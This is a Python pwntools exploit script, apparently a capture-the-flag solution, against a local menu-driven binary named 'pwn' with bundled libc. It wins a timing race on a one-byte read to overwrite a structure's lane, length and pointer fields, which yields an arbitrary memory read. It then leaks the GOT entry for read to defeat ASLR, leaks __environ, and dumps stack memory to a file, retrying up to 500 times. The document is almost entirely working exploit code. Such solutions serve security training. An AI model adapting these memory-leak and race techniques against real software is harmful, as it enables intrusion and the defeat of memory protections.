from pwn import *
import re
import time


context.binary = exe = ELF("./attachments/pwn", checksec=False)
libc = ELF("./attachments/libc.so.6", checksec=False)
ld = "./attachments/ld-linux-x86-64.so.2"
WAIT = 0.23


def start():
    io = process([ld, "--library-path", "./attachments", "./attachments/pwn"])
    io.recvuntil(b"> ")
    return io


def menu(io, n):
    io.sendline(str(n).encode())


def prep(io):
    menu(io, 2)
    io.send(b"B" * 0x30)
    io.recvuntil(b"forge committed")
    io.recvuntil(b"> ")
    menu(io, 3)
    io.recvuntil(b"actuator ready")
    io.recvuntil(b"> ")
    menu(io, 1)
    io.sendlineafter(b"appeal target (0x20-0x78)> ", b"0x78")
    io.recvuntil(b"supremacy.\n")
    io.recvuntil(b"> ")


def make_payload(lane, length, ptr):
    payload = bytearray(b"A" * 0x88)
    payload[:8] = b"sentinel"
    payload[0x30:0x38] = p64(0)
    payload[0x38:0x40] = p64(0x51)
    payload[0x50:0x54] = p32(lane)
    payload[0x58:0x60] = p64(length)
    payload[0x60:0x68] = p64(ptr)
    return bytes(payload)


def arm(io, lane, length, ptr):
    menu(io, 2)
    io.recvuntil(b"forge primer (1 byte)> ")
    time.sleep(WAIT)
    payload = make_payload(lane, length, ptr)
    io.send(payload[:1])
    io.send(payload[1:])
    io.recvuntil(b"forge committed")
    io.recvuntil(b"> ")
    menu(io, 7)
    blob = io.recvuntil(b"> ")
    return (f"lane={lane}".encode() in blob and f"len={hex(length)}".encode() in blob)


def leak(io, addr, size):
    if not arm(io, 0, size, addr):
        raise RuntimeError("race miss")
    menu(io, 6)
    blob = io.recvuntil(b"[dispatch complete]\n")
    blob += io.recvuntil(b"> ")
    lane_hdr = blob.find(b"]\n")
    done = blob.find(b"\n[dispatch complete]\n")
    return blob[lane_hdr + 2:done]


def attempt():
    io = start()
    try:
        prep(io)
        read_leak = u64(leak(io, exe.got["read"], 8))
        libc.address = read_leak - libc.sym["read"]
        env_ptr = u64(leak(io, libc.sym["__environ"], 8))
        stack = leak(io, env_ptr - 0x500, 0x600)
        print(hex(read_leak), hex(env_ptr))
        open("stackdump.bin", "wb").write(stack)
        return True
    finally:
        io.close()


def main():
    for i in range(1, 500):
        print("attempt", i)
        try:
            if attempt():
                return
        except Exception as e:
            print("fail", e)


if __name__ == "__main__":
    main()
